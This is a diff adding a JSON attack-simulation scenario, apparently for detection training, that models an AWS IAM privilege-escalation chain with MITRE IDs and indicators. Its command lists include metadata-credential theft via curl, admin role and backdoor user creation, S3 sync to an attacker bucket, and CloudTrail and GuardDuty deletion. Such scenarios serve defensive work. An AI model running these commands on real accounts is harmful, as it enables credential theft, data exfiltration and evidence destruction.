@@ -1,0 +1,167 @@
+{
+  "id": "sc-cloud-attack-001",
+  "name": "AWS Cloud Infrastructure Compromise — IAM Privilege Escalation",
+  "description": "A sophisticated cloud attack chain targeting AWS: initial access via exposed EC2 metadata service (SSRF), IAM credential theft from instance metadata, privilege escalation via misconfigured IAM policies, S3 bucket mass exfiltration, CloudTrail log deletion for anti-forensics, and persistence via new IAM admin user creation. Modeled on Capital One breach TTPs.",
+  "severity": "critical",
+  "category": "cloud",
+  "threat_actor": {
+    "name": "Scattered Spider",
+    "aliases": ["UNC3944", "Muddled Libra", "0ktapus"],
+    "origin": "Western (English-speaking)",
+    "motivation": "Financial gain, data theft",
+    "active_since": "2022"
+  },
+  "mitre_techniques_summary": [
+    "T1552.005", "T1078.004", "T1548.005", "T1530",
+    "T1537", "T1070.004", "T1136.003", "T1580"
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1552/005/",
+    "https://unit42.paloaltonetworks.com/cloud-threat-landscape/",
+    "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-208a"
+  ],
+  "kill_chain": ["initial_access", "discovery", "credential_access", "privilege_escalation", "collection", "exfiltration", "defense_evasion", "persistence"],
+  "phases": [
+    {
+      "phase": 1,
+      "name": "SSRF to EC2 Instance Metadata Credential Theft",
+      "description": "Attacker exploits an SSRF vulnerability in a web application running on EC2 to query the instance metadata service (IMDSv1). The IAM role credentials (access key, secret, session token) are extracted and used for lateral movement within AWS.",
+      "technique_id": "T1552.005",
+      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "tactic": "Credential Access",
+      "target_host": "ws-web-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 0,
+      "stealth_level": "high",
+      "indicators": {
+        "source_ip": "203.0.113.88",
+        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "commands": [
+          "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role",
+          "curl -s http://169.254.169.254/latest/meta-data/iam/info"
+        ]
+      },
+      "ioc": {
+        "urls": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+        "ips": ["203.0.113.88"]
+      }
+    },
+    {
+      "phase": 2,
+      "name": "AWS Cloud Enumeration via Stolen IAM Credentials",
+      "description": "Using the stolen IAM credentials externally, the attacker enumerates S3 buckets, EC2 instances, Lambda functions, RDS databases, and IAM policies to map the attack surface.",
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "tactic": "Discovery",
+      "target_host": "ws-it-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "indicators": {
+        "external_ip": "203.0.113.88",
+        "commands": [
+          "aws s3 ls --no-sign-request",
+          "aws iam list-users",
+          "aws iam list-roles",
+          "aws ec2 describe-instances --region us-east-1",
+          "aws lambda list-functions",
+          "aws sts get-caller-identity"
+        ]
+      },
+      "ioc": {
+        "tools": ["aws-cli", "pacu", "ScoutSuite"]
+      }
+    },
+    {
+      "phase": 3,
+      "name": "IAM Privilege Escalation via PassRole Abuse",
+      "description": "The attacker finds an IAM policy that allows iam:PassRole and lambda:CreateFunction. They create a Lambda function that assumes an admin role, bypassing permission boundaries and achieving admin-level access.",
+      "technique_id": "T1548.005",
+      "technique_name": "Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access",
+      "tactic": "Privilege Escalation",
+      "target_host": "ws-it-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 300,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "aws iam create-role --role-name evil-admin-role --assume-role-policy-document ...",
+          "aws iam attach-role-policy --role-name evil-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "aws lambda create-function --function-name privilege-escalation ...",
+          "aws lambda invoke --function-name privilege-escalation ..."
+        ]
+      },
+      "ioc": {
+        "tools": ["Pacu", "aws-cli"],
+        "events": ["CloudTrail: CreateRole, AttachRolePolicy from external IP"]
+      }
+    },
+    {
+      "phase": 4,
+      "name": "S3 Bucket Mass Exfiltration",
+      "description": "Using admin credentials, the attacker syncs all S3 buckets to an external storage. This includes customer PII, financial records, API keys in configuration files, and database backups totaling ~500GB.",
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "tactic": "Collection",
+      "target_host": "srv-file-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 300,
+      "stealth_level": "medium",
+      "indicators": {
+        "destination_ip": "104.21.55.100",
+        "data_size_mb": 512000,
+        "external_ip": "104.21.55.100",
+        "commands": [
+          "aws s3 sync s3://corp-prod-data s3://attacker-exfil-bucket --no-sign-request",
+          "aws s3 cp s3://corp-backups /tmp/exfil/ --recursive"
+        ]
+      },
+      "ioc": {
+        "ips": ["104.21.55.100"],
+        "events": ["CloudTrail: S3 GetObject spike from external IP"]
+      }
+    },
+    {
+      "phase": 5,
+      "name": "CloudTrail Deletion — Anti-Forensics",
+      "description": "To cover tracks, the attacker deletes all CloudTrail logs, disables CloudWatch alarms, and removes GuardDuty findings. They also delete VPC Flow Logs to eliminate network evidence.",
+      "technique_id": "T1070.004",
+      "technique_name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "target_host": "srv-dc-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 120,
+      "stealth_level": "low",
+      "indicators": {
+        "commands": [
+          "aws cloudtrail delete-trail --name corp-trail",
+          "aws s3 rm s3://corp-cloudtrail-logs --recursive",
+          "aws guardduty delete-detector --detector-id ...",
+          "aws logs delete-log-group --log-group-name /aws/vpc/flow-logs"
+        ]
+      }
+    },
+    {
+      "phase": 6,
+      "name": "IAM Backdoor User Creation for Persistence",
+      "description": "Attacker creates a new IAM user with AdministratorAccess policy and generates long-term access keys. A second persistence mechanism uses an EC2 user-data script to phone home on every instance launch.",
+      "technique_id": "T1136.003",
+      "technique_name": "Create Account: Cloud Account",
+      "tactic": "Persistence",
+      "target_host": "srv-dc-01",
+      "target_user": "ec2-user",
+      "delay_seconds": 120,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "aws iam create-user --user-name corp-backup-svc",
+          "aws iam attach-user-policy --user-name corp-backup-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "aws iam create-access-key --user-name corp-backup-svc"
+        ]
+      },
+      "ioc": {
+        "events": ["CloudTrail: CreateUser + CreateAccessKey + AttachUserPolicy sequence"]
+      }
+    }
+  ]
+}
